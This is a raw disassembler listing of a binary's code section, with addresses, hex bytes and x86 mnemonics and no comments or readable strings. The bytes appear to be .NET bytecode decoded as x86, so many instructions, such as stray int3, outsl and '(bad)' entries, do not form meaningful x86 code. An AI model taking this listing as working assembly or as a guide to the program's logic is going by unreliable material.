  403591:	2b 1f                	sub    (%edi),%ebx
  403593:	0e                   	push   %cs
  403594:	73 90                	jae    0x403526
  403596:	00 00                	add    %al,(%eax)
  403598:	0a 6f 95             	or     -0x6b(%edi),%ch
  40359b:	00 00                	add    %al,(%eax)
  40359d:	0a 02                	or     (%edx),%al
  40359f:	7b 32                	jnp    0x4035d3
  4035a1:	00 00                	add    %al,(%eax)
  4035a3:	04 19                	add    $0x19,%al
  4035a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4035a6:	96                   	xchg   %eax,%esi
  4035a7:	00 00                	add    %al,(%eax)
  4035a9:	0a 02                	or     (%edx),%al
  4035ab:	7b 32                	jnp    0x4035df
  4035ad:	00 00                	add    %al,(%eax)
  4035af:	04 17                	add    $0x17,%al
  4035b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4035b2:	b5 00                	mov    $0x0,%ch
  4035b4:	00 0a                	add    %cl,(%edx)
  4035b6:	02 7b 32             	add    0x32(%ebx),%bh
  4035b9:	00 00                	add    %al,(%eax)
  4035bb:	04 72                	add    $0x72,%al
  4035bd:	fd                   	std
  4035be:	05 00 70 6f 52       	add    $0x526f7000,%eax
  4035c3:	00 00                	add    %al,(%eax)
  4035c5:	0a 02                	or     (%edx),%al
  4035c7:	7b 32                	jnp    0x4035fb
  4035c9:	00 00                	add    %al,(%eax)
  4035cb:	04 16                	add    $0x16,%al
  4035cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4035ce:	79 00                	jns    0x4035d0
  4035d0:	00 0a                	add    %cl,(%edx)
  4035d2:	02 7b 32             	add    0x32(%ebx),%bh
  4035d5:	00 00                	add    %al,(%eax)
  4035d7:	04 28                	add    $0x28,%al
  4035d9:	b0 00                	mov    $0x0,%al
  4035db:	00 0a                	add    %cl,(%edx)
  4035dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4035de:	b6 00                	mov    $0x0,%dh
  4035e0:	00 0a                	add    %cl,(%edx)
  4035e2:	02 7b 32             	add    0x32(%ebx),%bh
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	04 02                	add    $0x2,%al
  4035e9:	fe 06                	incb   (%esi)
  4035eb:	2d 00 00 06 73       	sub    $0x73060000,%eax
  4035f0:	b7 00                	mov    $0x0,%bh
  4035f2:	00 0a                	add    %cl,(%edx)
  4035f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4035f5:	b8 00 00 0a 02       	mov    $0x20a0000,%eax
  4035fa:	22 00                	and    (%eax),%al
  4035fc:	00 c0                	add    %al,%al
  4035fe:	42                   	inc    %edx
  4035ff:	22 00                	and    (%eax),%al
  403601:	00 c0                	add    %al,%al
  403603:	42                   	inc    %edx
  403604:	73 b9                	jae    0x4035bf
  403606:	00 00                	add    %al,(%eax)
  403608:	0a 28                	or     (%eax),%ch
  40360a:	ba 00 00 0a 02       	mov    $0x20a0000,%edx
  40360f:	18 28                	sbb    %ch,(%eax)
  403611:	7c 00                	jl     0x403613
  403613:	00 0a                	add    %cl,(%edx)
  403615:	02 28                	add    (%eax),%ch
  403617:	bb 00 00 0a 6f       	mov    $0x6f0a0000,%ebx
  40361c:	9d                   	popf
  40361d:	00 00                	add    %al,(%eax)
  40361f:	0a 02                	or     (%edx),%al
  403621:	20 d6                	and    %dl,%dh
  403623:	01 00                	add    %eax,(%eax)
  403625:	00 20                	add    %ah,(%eax)
  403627:	cc                   	int3
  403628:	01 00                	add    %eax,(%eax)
  40362a:	00 73 90             	add    %dh,-0x70(%ebx)
  40362d:	00 00                	add    %al,(%eax)
  40362f:	0a 28                	or     (%eax),%ch
  403631:	bc 00 00 0a 02       	mov    $0x20a0000,%esp
  403636:	16                   	push   %ss
  403637:	28 bd 00 00 0a 02    	sub    %bh,0x20a0000(%ebp)
  40363d:	28 be 00 00 0a 02    	sub    %bh,0x20a0000(%esi)
  403643:	7b 32                	jnp    0x403677
  403645:	00 00                	add    %al,(%eax)
  403647:	04 6f                	add    $0x6f,%al
  403649:	bf 00 00 0a 02       	mov    $0x20a0000,%edi
  40364e:	28 be 00 00 0a 02    	sub    %bh,0x20a0000(%esi)
  403654:	7b 31                	jnp    0x403687
  403656:	00 00                	add    %al,(%eax)
  403658:	04 6f                	add    $0x6f,%al
  40365a:	bf 00 00 0a 02       	mov    $0x20a0000,%edi
  40365f:	28 be 00 00 0a 02    	sub    %bh,0x20a0000(%esi)
  403665:	7b 30                	jnp    0x403697
  403667:	00 00                	add    %al,(%eax)
  403669:	04 6f                	add    $0x6f,%al
  40366b:	bf 00 00 0a 02       	mov    $0x20a0000,%edi
  403670:	28 be 00 00 0a 02    	sub    %bh,0x20a0000(%esi)
  403676:	7b 2d                	jnp    0x4036a5
  403678:	00 00                	add    %al,(%eax)
  40367a:	04 6f                	add    $0x6f,%al
  40367c:	bf 00 00 0a 02       	mov    $0x20a0000,%edi
  403681:	28 be 00 00 0a 02    	sub    %bh,0x20a0000(%esi)
  403687:	7b 2f                	jnp    0x4036b8
  403689:	00 00                	add    %al,(%eax)
  40368b:	04 6f                	add    $0x6f,%al
  40368d:	bf 00 00 0a 02       	mov    $0x20a0000,%edi
  403692:	28 be 00 00 0a 02    	sub    %bh,0x20a0000(%esi)
  403698:	7b 2e                	jnp    0x4036c8
  40369a:	00 00                	add    %al,(%eax)
  40369c:	04 6f                	add    $0x6f,%al
  40369e:	bf 00 00 0a 02       	mov    $0x20a0000,%edi
  4036a3:	28 be 00 00 0a 02    	sub    %bh,0x20a0000(%esi)
  4036a9:	7b 2c                	jnp    0x4036d7
  4036ab:	00 00                	add    %al,(%eax)
  4036ad:	04 6f                	add    $0x6f,%al
  4036af:	bf 00 00 0a 02       	mov    $0x20a0000,%edi
  4036b4:	17                   	pop    %ss
  4036b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4036b6:	c0 00 00             	rolb   $0x0,(%eax)
  4036b9:	0a 02                	or     (%edx),%al
  4036bb:	16                   	push   %ss
  4036bc:	28 c1                	sub    %al,%cl
  4036be:	00 00                	add    %al,(%eax)
  4036c0:	0a 02                	or     (%edx),%al
  4036c2:	16                   	push   %ss
  4036c3:	28 c2                	sub    %al,%dl
  4036c5:	00 00                	add    %al,(%eax)
  4036c7:	0a 02                	or     (%edx),%al
  4036c9:	20 d6                	and    %dl,%dh
  4036cb:	01 00                	add    %eax,(%eax)
  4036cd:	00 20                	add    %ah,(%eax)
  4036cf:	cc                   	int3
  4036d0:	01 00                	add    %eax,(%eax)
  4036d2:	00 73 90             	add    %dh,-0x70(%ebx)
  4036d5:	00 00                	add    %al,(%eax)
  4036d7:	0a 6f c3             	or     -0x3d(%edi),%ch
  4036da:	00 00                	add    %al,(%eax)
  4036dc:	0a 02                	or     (%edx),%al
  4036de:	20 d6                	and    %dl,%dh
  4036e0:	01 00                	add    %eax,(%eax)
  4036e2:	00 20                	add    %ah,(%eax)
  4036e4:	cc                   	int3
  4036e5:	01 00                	add    %eax,(%eax)
  4036e7:	00 73 90             	add    %dh,-0x70(%ebx)
  4036ea:	00 00                	add    %al,(%eax)
  4036ec:	0a 6f 91             	or     -0x6f(%edi),%ch
  4036ef:	00 00                	add    %al,(%eax)
  4036f1:	0a 02                	or     (%edx),%al
  4036f3:	72 0b                	jb     0x403700
  4036f5:	06                   	push   %es
  4036f6:	00 70 28             	add    %dh,0x28(%eax)
  4036f9:	92                   	xchg   %eax,%edx
  4036fa:	00 00                	add    %al,(%eax)
  4036fc:	0a 02                	or     (%edx),%al
  4036fe:	18 28                	sbb    %ch,(%eax)
  403700:	c4 00                	les    (%eax),%eax
  403702:	00 0a                	add    %cl,(%edx)
  403704:	02 17                	add    (%edi),%dl
  403706:	28 c5                	sub    %al,%ch
  403708:	00 00                	add    %al,(%eax)
  40370a:	0a 02                	or     (%edx),%al
  40370c:	72 15                	jb     0x403723
  40370e:	06                   	push   %es
  40370f:	00 70 6f             	add    %dh,0x6f(%eax)
  403712:	52                   	push   %edx
  403713:	00 00                	add    %al,(%eax)
  403715:	0a 02                	or     (%edx),%al
  403717:	02 fe                	add    %dh,%bh
  403719:	06                   	push   %es
  40371a:	22 00                	and    (%eax),%al
  40371c:	00 06                	add    %al,(%esi)
  40371e:	73 74                	jae    0x403794
  403720:	00 00                	add    %al,(%eax)
  403722:	0a 28                	or     (%eax),%ch
  403724:	c6 00 00             	movb   $0x0,(%eax)
  403727:	0a 02                	or     (%edx),%al
  403729:	7b 2d                	jnp    0x403758
  40372b:	00 00                	add    %al,(%eax)
  40372d:	04 6f                	add    $0x6f,%al
  40372f:	c7 00 00 0a 02 7b    	movl   $0x7b020a00,(%eax)
  403735:	31 00                	xor    %eax,(%eax)
  403737:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40373a:	c7 00 00 0a 02 16    	movl   $0x16020a00,(%eax)
  403740:	28 c8                	sub    %cl,%al
  403742:	00 00                	add    %al,(%eax)
  403744:	0a 02                	or     (%edx),%al
  403746:	28 c9                	sub    %cl,%cl
  403748:	00 00                	add    %al,(%eax)
  40374a:	0a 2a                	or     (%edx),%ch
  40374c:	3e 02 16             	add    %ds:(%esi),%dl
  40374f:	7d 28                	jge    0x403779
  403751:	00 00                	add    %al,(%eax)
  403753:	04 02                	add    $0x2,%al
  403755:	17                   	pop    %ss
  403756:	28 79 00             	sub    %bh,0x0(%ecx)
  403759:	00 0a                	add    %cl,(%edx)
  40375b:	2a 2e                	sub    (%esi),%ch
  40375d:	73 33                	jae    0x403792
  40375f:	00 00                	add    %al,(%eax)
  403761:	06                   	push   %es
  403762:	80 33 00             	xorb   $0x0,(%ebx)
  403765:	00 04 2a             	add    %al,(%edx,%ebp,1)
  403768:	1e                   	push   %ds
  403769:	02 28                	add    (%eax),%ch
  40376b:	0a 00                	or     (%eax),%al
  40376d:	00 0a                	add    %cl,(%edx)
  40376f:	2a 12                	sub    (%edx),%dl
  403771:	04 17                	add    $0x17,%al
  403773:	52                   	push   %edx
  403774:	2a c2                	sub    %dl,%al
  403776:	02 7b 35             	add    0x35(%ebx),%bh
  403779:	00 00                	add    %al,(%eax)
  40377b:	04 6f                	add    $0x6f,%al
  40377d:	ca 00 00             	lret   $0x0
  403780:	0a 02                	or     (%edx),%al
  403782:	7b 35                	jnp    0x4037b9
  403784:	00 00                	add    %al,(%eax)
  403786:	04 6f                	add    $0x6f,%al
  403788:	cb                   	lret
  403789:	00 00                	add    %al,(%eax)
  40378b:	0a 02                	or     (%edx),%al
  40378d:	14 7d                	adc    $0x7d,%al
  40378f:	35 00 00 04 02       	xor    $0x2040000,%eax
  403794:	7b 36                	jnp    0x4037cc
  403796:	00 00                	add    %al,(%eax)
  403798:	04 02                	add    $0x2,%al
  40379a:	7b 37                	jnp    0x4037d3
  40379c:	00 00                	add    %al,(%eax)
  40379e:	04 28                	add    $0x28,%al
  4037a0:	cc                   	int3
  4037a1:	00 00                	add    %al,(%eax)
  4037a3:	0a 26                	or     (%esi),%ah
  4037a5:	2a 1e                	sub    (%esi),%bl
  4037a7:	02 7b 38             	add    0x38(%ebx),%bh
  4037aa:	00 00                	add    %al,(%eax)
  4037ac:	04 2a                	add    $0x2a,%al
  4037ae:	3a 02                	cmp    (%edx),%al
  4037b0:	28 0a                	sub    %cl,(%edx)
  4037b2:	00 00                	add    %al,(%eax)
  4037b4:	0a 02                	or     (%edx),%al
  4037b6:	03 7d 38             	add    0x38(%ebp),%edi
  4037b9:	00 00                	add    %al,(%eax)
  4037bb:	04 2a                	add    $0x2a,%al
  4037bd:	00 00                	add    %al,(%eax)
  4037bf:	00 13                	add    %dl,(%ebx)
  4037c1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4037c4:	2c 00                	sub    $0x0,%al
  4037c6:	00 00                	add    %al,(%eax)
  4037c8:	0c 00                	or     $0x0,%al
  4037ca:	00 11                	add    %dl,(%ecx)
  4037cc:	72 21                	jb     0x4037ef
  4037ce:	06                   	push   %es
  4037cf:	00 70 28             	add    %dh,0x28(%eax)
  4037d2:	cd 00                	int    $0x0
  4037d4:	00 0a                	add    %cl,(%edx)
  4037d6:	72 3d                	jb     0x403815
  4037d8:	01 00                	add    %eax,(%eax)
  4037da:	70 28                	jo     0x403804
  4037dc:	ce                   	into
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 cf                	sub    %cl,%bh
  4037e5:	00 00                	add    %al,(%eax)
  4037e7:	0a 8c 10 00 00 01 28 	or     0x28010000(%eax,%edx,1),%cl
  4037ee:	d0 00                	rolb   $1,(%eax)
  4037f0:	00 0a                	add    %cl,(%edx)
  4037f2:	73 38                	jae    0x40382c
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	06                   	push   %es
  4037f7:	2a 1b                	sub    (%ebx),%bl
  4037f9:	30 01                	xor    %al,(%ecx)
  4037fb:	00 11                	add    %dl,(%ecx)
  4037fd:	00 00                	add    %al,(%eax)
  4037ff:	00 00                	add    %al,(%eax)
  403801:	00 00                	add    %al,(%eax)
  403803:	00 02                	add    %al,(%edx)
  403805:	28 37                	sub    %dh,(%edi)
  403807:	00 00                	add    %al,(%eax)
  403809:	06                   	push   %es
  40380a:	28 d1                	sub    %dl,%cl
  40380c:	00 00                	add    %al,(%eax)
  40380e:	0a de                	or     %dh,%bl
  403810:	03 26                	add    (%esi),%esp
  403812:	de 00                	fiadds (%eax)
  403814:	2a 00                	sub    (%eax),%al
  403816:	00 00                	add    %al,(%eax)
  403818:	01 10                	add    %edx,(%eax)
  40381a:	00 00                	add    %al,(%eax)
  40381c:	00 00                	add    %al,(%eax)
  40381e:	00 00                	add    %al,(%eax)
  403820:	0d 0d 00 03 0b       	or     $0xb03000d,%eax
  403825:	00 00                	add    %al,(%eax)
  403827:	01 1b                	add    %ebx,(%ebx)
  403829:	30 04 00             	xor    %al,(%eax,%eax,1)
  40382c:	97                   	xchg   %eax,%edi
  40382d:	00 00                	add    %al,(%eax)
  40382f:	00 0d 00 00 11 73    	add    %cl,0x73110000
  403835:	3d 00 00 06 0a       	cmp    $0xa060000,%eax
  40383a:	06                   	push   %es
  40383b:	03 7d 3b             	add    0x3b(%ebp),%edi
  40383e:	00 00                	add    %al,(%eax)
  403840:	04 06                	add    $0x6,%al
  403842:	02 7d 3c             	add    0x3c(%ebp),%bh
  403845:	00 00                	add    %al,(%eax)
  403847:	04 06                	add    $0x6,%al
  403849:	73 d2                	jae    0x40381d
  40384b:	00 00                	add    %al,(%eax)
  40384d:	0a 25 02 28 37 00    	or     0x372802,%ah
  403853:	00 06                	add    %al,(%esi)
  403855:	6f                   	outsl  %ds:(%esi),(%dx)
  403856:	d3 00                	roll   %cl,(%eax)
  403858:	00 0a                	add    %cl,(%edx)
  40385a:	25 72 4b 06 00       	and    $0x64b72,%eax
  40385f:	70 6f                	jo     0x4038d0
  403861:	d4 00                	aam    $0x0
  403863:	00 0a                	add    %cl,(%edx)
  403865:	25 17 6f d5 00       	and    $0xd56f17,%eax
  40386a:	00 0a                	add    %cl,(%edx)
  40386c:	25 16 6f d6 00       	and    $0xd66f16,%eax
  403871:	00 0a                	add    %cl,(%edx)
  403873:	28 d7                	sub    %dl,%bh
  403875:	00 00                	add    %al,(%eax)
  403877:	0a 7d 39             	or     0x39(%ebp),%bh
  40387a:	00 00                	add    %al,(%eax)
  40387c:	04 de                	add    $0xde,%al
  40387e:	0a 26                	or     (%esi),%ah
  403880:	16                   	push   %ss
  403881:	28 09                	sub    %cl,(%ecx)
  403883:	00 00                	add    %al,(%eax)
  403885:	2b 0b                	sub    (%ebx),%ecx
  403887:	de 40 06             	fiadds 0x6(%eax)
  40388a:	18 8c 78 00 00 01 73 	sbb    %cl,0x73010000(%eax,%edi,2)
  403891:	d9 00                	flds   (%eax)
  403893:	00 0a                	add    %cl,(%edx)
  403895:	7d 3a                	jge    0x4038d1
  403897:	00 00                	add    %al,(%eax)
  403899:	04 06                	add    $0x6,%al
  40389b:	7b 39                	jnp    0x4038d6
  40389d:	00 00                	add    %al,(%eax)
  40389f:	04 06                	add    $0x6,%al
  4038a1:	fe 06                	incb   (%esi)
  4038a3:	3e 00 00             	add    %al,%ds:(%eax)
  4038a6:	06                   	push   %es
  4038a7:	73 ae                	jae    0x403857
  4038a9:	00 00                	add    %al,(%eax)
  4038ab:	0a 6f da             	or     -0x26(%edi),%ch
  4038ae:	00 00                	add    %al,(%eax)
  4038b0:	0a 06                	or     (%esi),%al
  4038b2:	7b 39                	jnp    0x4038ed
  4038b4:	00 00                	add    %al,(%eax)
  4038b6:	04 17                	add    $0x17,%al
  4038b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b9:	db 00                	fildl  (%eax)
  4038bb:	00 0a                	add    %cl,(%edx)
  4038bd:	06                   	push   %es
  4038be:	7b 3a                	jnp    0x4038fa
  4038c0:	00 00                	add    %al,(%eax)
  4038c2:	04 6f                	add    $0x6f,%al
  4038c4:	dc 00                	faddl  (%eax)
  4038c6:	00 0a                	add    %cl,(%edx)
  4038c8:	2a 07                	sub    (%edi),%al
  4038ca:	2a 00                	sub    (%eax),%al
  4038cc:	01 10                	add    %edx,(%eax)
  4038ce:	00 00                	add    %al,(%eax)
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	14 00                	adc    $0x0,%al
  4038d4:	37                   	aaa
  4038d5:	4b                   	dec    %ebx
  4038d6:	00 0a                	add    %cl,(%edx)
  4038d8:	0b 00                	or     (%eax),%eax
  4038da:	00 01                	add    %al,(%ecx)
  4038dc:	1b 30                	sbb    (%eax),%esi
  4038de:	02 00                	add    (%eax),%al
  4038e0:	8e 00                	mov    (%eax),%es
  4038e2:	00 00                	add    %al,(%eax)
  4038e4:	0e                   	push   %cs
  4038e5:	00 00                	add    %al,(%eax)
  4038e7:	11 16                	adc    %edx,(%esi)
  4038e9:	0a 28                	or     (%eax),%ch
  4038eb:	dd 00                	fldl   (%eax)
  4038ed:	00 0a                	add    %cl,(%edx)
  4038ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4038f0:	de 00                	fiadds (%eax)
  4038f2:	00 0a                	add    %cl,(%edx)
  4038f4:	0b 28                	or     (%eax),%ebp
  4038f6:	df 00                	filds  (%eax)
  4038f8:	00 0a                	add    %cl,(%edx)
  4038fa:	0c de                	or     $0xde,%al
  4038fc:	05 26 16 0d de       	add    $0xde0d1626,%eax
  403901:	72 08                	jb     0x40390b
  403903:	13 04 16             	adc    (%esi,%edx,1),%eax
  403906:	13 05 2b 60 11 04    	adc    0x411602b,%eax
  40390c:	11 05 9a 13 06 11    	adc    %eax,0x1106139a
  403912:	06                   	push   %es
  403913:	6f                   	outsl  %ds:(%esi),(%dx)
  403914:	de 00                	fiadds (%eax)
  403916:	00 0a                	add    %cl,(%edx)
  403918:	07                   	pop    %es
  403919:	2e 49                	cs dec %ecx
  40391b:	7e 04                	jle    0x403921
  40391d:	00 00                	add    %al,(%eax)
  40391f:	04 13                	add    $0x13,%al
  403921:	07                   	pop    %es
  403922:	16                   	push   %ss
  403923:	13 08                	adc    (%eax),%ecx
  403925:	2b 35 11 07 11 08    	sub    0x8110711,%esi
  40392b:	9a 13 09 11 06 6f e0 	lcall  $0xe06f,$0x6110913
  403932:	00 00                	add    %al,(%eax)
  403934:	0a 6f e1             	or     -0x1f(%edi),%ch
  403937:	00 00                	add    %al,(%eax)
  403939:	0a 6f e2             	or     -0x1e(%edi),%ch
  40393c:	00 00                	add    %al,(%eax)
  40393e:	0a 11                	or     (%ecx),%dl
  403940:	09 6f e3             	or     %ebp,-0x1d(%edi)
  403943:	00 00                	add    %al,(%eax)
  403945:	0a 2c 09             	or     (%ecx,%ecx,1),%ch
  403948:	11 06                	adc    %eax,(%esi)
  40394a:	6f                   	outsl  %ds:(%esi),(%dx)
  40394b:	e4 00                	in     $0x0,%al
  40394d:	00 0a                	add    %cl,(%edx)
  40394f:	17                   	pop    %ss
  403950:	0a de                	or     %dh,%bl
  403952:	03 26                	add    (%esi),%esp
  403954:	de 00                	fiadds (%eax)
  403956:	11 08                	adc    %ecx,(%eax)
  403958:	17                   	pop    %ss
  403959:	58                   	pop    %eax
  40395a:	13 08                	adc    (%eax),%ecx
  40395c:	11 08                	adc    %ecx,(%eax)
  40395e:	11 07                	adc    %eax,(%edi)
  403960:	8e 69 32             	mov    0x32(%ecx),%gs
  403963:	c3                   	ret
  403964:	11 05 17 58 13 05    	adc    %eax,0x5135817
  40396a:	11 05 11 04 8e 69    	adc    %eax,0x698e0411
  403970:	32 98 06 2a 09 2a    	xor    0x2a092a06(%eax),%bl
  403976:	00 00                	add    %al,(%eax)
  403978:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 0d 00 08 15 00    	add    %cl,0x150800
  403983:	05 0b 00 00 01       	add    $0x100000b,%eax
  403988:	00 00                	add    %al,(%eax)
  40398a:	46                   	inc    %esi
  40398b:	00 25 6b 00 03 0b    	add    %ah,0xb03006b
  403991:	00 00                	add    %al,(%eax)
  403993:	01 13                	add    %edx,(%ebx)
  403995:	30 02                	xor    %al,(%edx)
  403997:	00 2b                	add    %ch,(%ebx)
  403999:	00 00                	add    %al,(%eax)
  40399b:	00 0f                	add    %cl,(%edi)
  40399d:	00 00                	add    %al,(%eax)
  40399f:	11 12                	adc    %edx,(%edx)
  4039a1:	00 28                	add    %ch,(%eax)
  4039a3:	0e                   	push   %cs
  4039a4:	00 00                	add    %al,(%eax)
  4039a6:	0a 7d 3e             	or     0x3e(%ebp),%bh
  4039a9:	00 00                	add    %al,(%eax)
  4039ab:	04 12                	add    $0x12,%al
  4039ad:	00 02                	add    %al,(%edx)
  4039af:	7d 3f                	jge    0x4039f0
  4039b1:	00 00                	add    %al,(%eax)
  4039b3:	04 12                	add    $0x12,%al
  4039b5:	00 15 7d 3d 00 00    	add    %dl,0x3d7d
  4039bb:	04 12                	add    $0x12,%al
  4039bd:	00 7c 3e 00          	add    %bh,0x0(%esi,%edi,1)
  4039c1:	00 04 12             	add    %al,(%edx,%edx,1)
  4039c4:	00 28                	add    %ch,(%eax)
  4039c6:	0a 00                	or     (%eax),%al
  4039c8:	00 2b                	add    %ch,(%ebx)
  4039ca:	2a 00                	sub    (%eax),%al
  4039cc:	1b 30                	sbb    (%eax),%esi
  4039ce:	03 00                	add    (%eax),%eax
  4039d0:	fd                   	std
  4039d1:	00 00                	add    %al,(%eax)
  4039d3:	00 10                	add    %dl,(%eax)
  4039d5:	00 00                	add    %al,(%eax)
  4039d7:	11 02                	adc    %eax,(%edx)
  4039d9:	7b 3d                	jnp    0x403a18
  4039db:	00 00                	add    %al,(%eax)
  4039dd:	04 0a                	add    $0xa,%al
  4039df:	02 7b 3f             	add    0x3f(%ebx),%bh
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	04 0b                	add    $0xb,%al
  4039e6:	06                   	push   %es
  4039e7:	39 80 00 00 00 07    	cmp    %eax,0x7000000(%eax)
  4039ed:	7b 39                	jnp    0x403a28
  4039ef:	00 00                	add    %al,(%eax)
  4039f1:	04 6f                	add    $0x6f,%al
  4039f3:	e5 00                	in     $0x0,%eax
  4039f5:	00 0a                	add    %cl,(%edx)
  4039f7:	07                   	pop    %es
  4039f8:	7b 39                	jnp    0x403a33
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	04 6f                	add    $0x6f,%al
  4039fe:	cb                   	lret
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	0a 02                	or     (%edx),%al
  403a03:	07                   	pop    %es
  403a04:	7b 3a                	jnp    0x403a40
  403a06:	00 00                	add    %al,(%eax)
  403a08:	04 7d                	add    $0x7d,%al
  403a0a:	40                   	inc    %eax
  403a0b:	00 00                	add    %al,(%eax)
  403a0d:	04 16                	add    $0x16,%al
  403a0f:	fe 01                	incb   (%ecx)
  403a11:	0c 08                	or     $0x8,%al
  403a13:	2d 7e 07 7b 3b       	sub    $0x3b7b077e,%eax
  403a18:	00 00                	add    %al,(%eax)
  403a1a:	04 2c                	add    $0x2c,%al
  403a1c:	0d 07 7b 3c 00       	or     $0x3c7b07,%eax
  403a21:	00 04 28             	add    %al,(%eax,%ebp,1)
  403a24:	3c 00                	cmp    $0x0,%al
  403a26:	00 06                	add    %al,(%esi)
  403a28:	2b 01                	sub    (%ecx),%eax
  403a2a:	16                   	push   %ss
  403a2b:	0d 09 2c 62 07       	or     $0x7622c09,%eax
  403a30:	7b 3c                	jnp    0x403a6e
  403a32:	00 00                	add    %al,(%eax)
  403a34:	04 16                	add    $0x16,%al
  403a36:	28 3b                	sub    %bh,(%ebx)
  403a38:	00 00                	add    %al,(%eax)
  403a3a:	06                   	push   %es
  403a3b:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3c:	42                   	inc    %edx
  403a3d:	00 00                	add    %al,(%eax)
  403a3f:	0a 13                	or     (%ebx),%dl
  403a41:	04 12                	add    $0x12,%al
  403a43:	04 28                	add    $0x28,%al
  403a45:	43                   	inc    %ebx
  403a46:	00 00                	add    %al,(%eax)
  403a48:	0a 2d 3e 02 16 25    	or     0x2516023e,%ch
  403a4e:	0a 7d 3d             	or     0x3d(%ebp),%bh
  403a51:	00 00                	add    %al,(%eax)
  403a53:	04 02                	add    $0x2,%al
  403a55:	11 04 7d 41 00 00 04 	adc    %eax,0x4000041(,%edi,2)
  403a5c:	02 7c 3e 00          	add    0x0(%esi,%edi,1),%bh
  403a60:	00 04 12             	add    %al,(%edx,%edx,1)
  403a63:	04 02                	add    $0x2,%al
  403a65:	28 0b                	sub    %cl,(%ebx)
  403a67:	00 00                	add    %al,(%eax)
  403a69:	2b de                	sub    %esi,%ebx
  403a6b:	68 02 7b 41 00       	push   $0x417b02
  403a70:	00 04 13             	add    %al,(%ebx,%edx,1)
  403a73:	04 02                	add    $0x2,%al
  403a75:	7c 41                	jl     0x403ab8
  403a77:	00 00                	add    %al,(%eax)
  403a79:	04 fe                	add    $0xfe,%al
  403a7b:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  403a80:	02 15 25 0a 7d 3d    	add    0x3d7d0a25,%dl
  403a86:	00 00                	add    %al,(%eax)
  403a88:	04 12                	add    $0x12,%al
  403a8a:	04 28                	add    $0x28,%al
  403a8c:	44                   	inc    %esp
  403a8d:	00 00                	add    %al,(%eax)
  403a8f:	0a 0d 09 0c 02 7b    	or     0x7b020c09,%cl
  403a95:	40                   	inc    %eax
  403a96:	00 00                	add    %al,(%eax)
  403a98:	04 08                	add    $0x8,%al
  403a9a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9b:	e6 00                	out    %al,$0x0
  403a9d:	00 0a                	add    %cl,(%edx)
  403a9f:	02 14 7d 40 00 00 04 	add    0x4000040(,%edi,2),%dl
  403aa6:	de 19                	ficomps (%ecx)
  403aa8:	13 05 02 1f fe 7d    	adc    0x7dfe1f02,%eax
  403aae:	3d 00 00 04 02       	cmp    $0x2040000,%eax
  403ab3:	7c 3e                	jl     0x403af3
  403ab5:	00 00                	add    %al,(%eax)
  403ab7:	04 11                	add    $0x11,%al
  403ab9:	05 28 46 00 00       	add    $0x4628,%eax
  403abe:	0a de                	or     %dh,%bl
  403ac0:	13 02                	adc    (%edx),%eax
  403ac2:	1f                   	pop    %ds
  403ac3:	fe                   	(bad)
  403ac4:	7d 3d                	jge    0x403b03
  403ac6:	00 00                	add    %al,(%eax)
  403ac8:	04 02                	add    $0x2,%al
  403aca:	7c 3e                	jl     0x403b0a
  403acc:	00 00                	add    %al,(%eax)
  403ace:	04 28                	add    $0x28,%al
  403ad0:	47                   	inc    %edi
  403ad1:	00 00                	add    %al,(%eax)
  403ad3:	0a 2a                	or     (%edx),%ch
  403ad5:	00 00                	add    %al,(%eax)
  403ad7:	00 01                	add    %al,(%ecx)
  403ad9:	10 00                	adc    %al,(%eax)
  403adb:	00 00                	add    %al,(%eax)
  403add:	00 0e                	add    %cl,(%esi)
  403adf:	00 c2                	add    %al,%dl
  403ae1:	d0 00                	rolb   $1,(%eax)
  403ae3:	19 28                	sbb    %ebp,(%eax)
  403ae5:	00 00                	add    %al,(%eax)
  403ae7:	01 36                	add    %esi,(%esi)
  403ae9:	02 7c 3e 00          	add    0x0(%esi,%edi,1),%bh
  403aed:	00 04 03             	add    %al,(%ebx,%eax,1)
  403af0:	28 48 00             	sub    %cl,0x0(%eax)
  403af3:	00 0a                	add    %cl,(%edx)
  403af5:	2a 00                	sub    (%eax),%al
  403af7:	00 13                	add    %dl,(%ebx)
  403af9:	30 04 00             	xor    %al,(%eax,%eax,1)
  403afc:	6c                   	insb   (%dx),%es:(%edi)
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 11                	add    %dl,(%ecx)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 1f                	adc    %ebx,(%edi)
  403b05:	1c 28                	sbb    $0x28,%al
  403b07:	13 00                	adc    (%eax),%eax
  403b09:	00 0a                	add    %cl,(%edx)
  403b0b:	0a 06                	or     (%esi),%al
  403b0d:	72 49                	jb     0x403b58
  403b0f:	01 00                	add    %eax,(%eax)
  403b11:	70 72                	jo     0x403b85
  403b13:	5d                   	pop    %ebp
  403b14:	06                   	push   %es
  403b15:	00 70 28             	add    %dh,0x28(%eax)
  403b18:	16                   	push   %ss
  403b19:	00 00                	add    %al,(%eax)
  403b1b:	0a 06                	or     (%esi),%al
  403b1d:	72 3d                	jb     0x403b5c
  403b1f:	01 00                	add    %eax,(%eax)
  403b21:	70 72                	jo     0x403b95
  403b23:	6f                   	outsl  %ds:(%esi),(%dx)
  403b24:	06                   	push   %es
  403b25:	00 70 28             	add    %dh,0x28(%eax)
  403b28:	16                   	push   %ss
  403b29:	00 00                	add    %al,(%eax)
  403b2b:	0a 0b                	or     (%ebx),%cl
